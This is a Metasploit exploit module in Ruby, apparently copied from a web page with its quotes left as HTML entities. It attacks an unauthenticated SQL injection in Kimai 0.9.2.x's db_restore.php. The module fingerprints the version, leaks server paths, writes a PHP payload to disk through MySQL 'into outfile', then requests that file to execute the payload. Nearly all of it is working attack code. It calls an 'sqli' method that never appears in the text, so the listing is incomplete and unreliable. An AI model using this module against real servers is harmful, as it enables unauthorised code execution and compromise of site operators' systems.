 
class Metasploit3 < Msf::Exploit::Remote
  Rank = AverageRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Kimai v0.9.2 &#039;db_restore.php&#039; SQL Injection",
      &#039;Description&#039;    => %q{
          This module exploits a SQL injection vulnerability in Kimai version
        0.9.2.x. The &#039;db_restore.php&#039; file allows unauthenticated users to
        execute arbitrary SQL queries. This module writes a PHP payload to
        disk if the following conditions are met: The PHP configuration must
        have &#039;display_errors&#039; enabled, Kimai must be configured to use a
        MySQL database running on localhost; and the MySQL user must have
        write permission to the Kimai &#039;temporary&#039; directory.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;drone (@dronesec)&#039;, # Discovery and PoC
          &#039;Brendan Coles <bcoles[at]gmail.com>&#039; # Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;EDB&#039;       => &#039;25606&#039;],
          [&#039;OSVDB&#039;     => &#039;93547&#039;],
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;      => 8000, # HTTP POST
          &#039;DisableNops&#039;=> true,
          &#039;BadChars&#039;   => "\x00\x0a\x0d\x27"
        },
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Targets&#039;        =>
        [
          # Tested on Kimai versions 0.9.2.beta, 0.9.2.1294.beta, 0.9.2.1306-3
          [ &#039;Kimai version 0.9.2.x (PHP Payload)&#039;, { &#039;auto&#039; => true } ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;May 21 2013&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
      register_options(
        [
          OptString.new(&#039;TARGETURI&#039;,  [true,  &#039;The base path to Kimai&#039;, &#039;/kimai/&#039;]),
          OptString.new(&#039;FALLBACK_TARGET_PATH&#039;, [false, &#039;The path to the web server document root directory&#039;, &#039;/var/www/&#039;]),
        ], self.class)
  end
 
  #
  # Checks if target is Kimai version 0.9.2.x
  #
  def check
    print_status("#{peer} - Checking version...")
    res = send_request_raw({ &#039;uri&#039; => normalize_uri(target_uri.path, "index.php") })
    if not res
      print_error("#{peer} - Request timed out")
      return Exploit::CheckCode::Unknown
    elsif res.body =~ /Kimai/ and res.body =~ /(0\.9\.[\d\.]+)<\/strong>/
      version = "#{$1}"
      print_good("#{peer} - Found version: #{version}")
      if version >= "0.9.2" and version <= "0.9.2.1306"
        return Exploit::CheckCode::Detected
      else
        return Exploit::CheckCode::Safe
      end
    end
    Exploit::CheckCode::Unknown
  end
 
  def exploit
 
    # Get file system path
    print_status("#{peer} - Retrieving file system path...")
    res = send_request_raw({ &#039;uri&#039; => normalize_uri(target_uri.path, &#039;includes/vars.php&#039;) })
    if not res
      fail_with(Failure::Unknown, "#{peer} - Request timed out")
    elsif res.body =~ /Undefined variable: .+ in (.+)includes\/vars\.php on line \d+/
      path = "#{$1}"
      print_good("#{peer} - Found file system path: #{path}")
    else
      path = normalize_uri(datastore[&#039;FALLBACK_TARGET_PATH&#039;], target_uri.path)
      print_warning("#{peer} - Could not retrieve file system path. Assuming &#039;#{path}&#039;")
    end
 
    res = send_request_raw({ &#039;uri&#039; => normalize_uri(target_uri.path, &#039;temporary&#039;, &#039;logfile.txt&#039;) })
    if not res
      fail_with(Failure::Unknown, "#{peer} - Request timed out")
    else
    end
 
    # Create a backup ID
    print_status("#{peer} - Creating a backup to get a valid backup ID...")
    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;db_restore.php&#039;),
      &#039;vars_post&#039; => {
        &#039;submit&#039;  => &#039;create backup&#039;
      }
    })
    if not res
      fail_with(Failure::Unknown, "#{peer} - Request timed out")
    elsif backup_ids = res.body.scan(/name="dates\[\]" value="(\d+)">/)
      id = "#{backup_ids.flatten.last}"
      print_good("#{peer} - Found backup ID: #{id}")
    else
      fail_with(Failure::Unknown, "#{peer} - Could not retrieve backup ID")
    end
 
    # Write PHP payload to disk using MySQL injection &#039;into outfile&#039;
    fname = "#{rand_text_alphanumeric(rand(10)+10)}.php"
    print_status("#{peer} - Writing payload (#{payload.encoded.length} bytes) to &#039;#{path}/temporary/#{fname}&#039;...")
    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;db_restore.php&#039;),
      &#039;vars_post&#039; => Hash[{
        &#039;submit&#039;  => &#039;recover&#039;,
        &#039;dates[]&#039; => sqli
      }.to_a.shuffle]
    })
    if not res
      fail_with(Failure::Unknown, "#{peer} - Request timed out")
    elsif res.code == 200
      print_good("#{peer} - Payload sent successfully")
      register_files_for_cleanup(fname)
    else
      print_error("#{peer} - Sending payload failed. Received HTTP code: #{res.code}")
    end
 
    # Remove the backup
    print_status("#{peer} - Removing the backup...")
    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;db_restore.php&#039;),
      &#039;vars_post&#039; => Hash[{
        &#039;submit&#039;  => &#039;delete&#039;,
        &#039;dates[]&#039; => "#{id}"
      }.to_a.shuffle]
    })
    if not res
      print_warning("#{peer} - Request timed out")
    elsif res.code == 302 and res.body !~ /#{id}/
      vprint_good("#{peer} - Deleted backup with ID &#039;#{id}&#039;")
    else
      print_warning("#{peer} - Could not remove backup with ID &#039;#{id}&#039;")
    end
 
    # Execute payload
    print_status("#{peer} - Retrieving file &#039;#{fname}&#039;...")
    res = send_request_raw({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;temporary&#039;, "#{fname}")
    }, 5)
  end
end

